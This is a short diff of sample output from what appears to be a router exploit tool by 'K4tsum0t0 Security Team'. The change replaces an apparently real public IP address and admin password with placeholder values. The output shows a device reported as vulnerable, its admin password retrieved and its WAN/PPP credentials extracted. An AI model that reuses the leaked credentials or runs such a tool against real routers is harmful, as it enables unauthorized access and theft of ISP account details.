@@ -14,9 +14,9 @@ _   _
                   K4tsum0t0 Security Team
 
 
-[+] Checking 41.227.171.45 ...
+[+] Checking 192.168.1.1 ...
 [+] Vulnerable
-admin password : 64123789
+admin password : admin
 [+] extracting WAN credentials ...
 username = hexa****@hexabyte.tn
 var pwdppp = "**********";
